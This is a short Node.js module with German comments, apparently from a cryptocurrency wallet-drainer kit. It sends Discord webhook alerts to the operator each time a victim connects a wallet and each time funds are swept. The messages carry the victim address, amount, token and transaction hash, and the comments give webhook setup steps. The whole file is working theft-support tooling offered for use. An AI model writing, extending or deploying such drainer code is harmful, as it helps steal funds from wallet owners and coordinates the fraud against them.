// Discord-Alarm: pingt dich bei jedem Opfer + jedem Sweep — keine Nummer nötig
// Setup: Discord-Kanal → Zahnrad → Integrationen → Webhooks → Neuer Webhook → URL kopieren
// URL in config.json bei discordWebhook eintragen, pushen, fertig.
const fs = require('fs');
const path = require('path');

function loadCfg(){
  try{ return JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'config.json'), 'utf8')); }
  catch(e){ return {}; }
}

async function send(content){
  const cfg = loadCfg();
  if(!cfg.discordWebhook) return false;
  try{
    const r = await fetch(cfg.discordWebhook, {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ content: content.slice(0, 1900) })
    });
    return r.ok;
  }catch(e){ return false; }
}

function alertConnect(victim){
  return send(`🎣 **Neuer Connect**\n\`${victim}\`\n<https://etherscan.io/address/${victim}>`);
}

function alertSweep(info){
  const { type, victim, amount, token, txHash } = info;
  return send(`💰 **Sweep: ${type}**\nOpfer: \`${victim}\`\nBetrag: \`${amount||'?'}\`\nToken: \`${token||'-'}\`\nTX: ${txHash||'-'}`);
}

module.exports = { send, alertConnect, alertSweep };
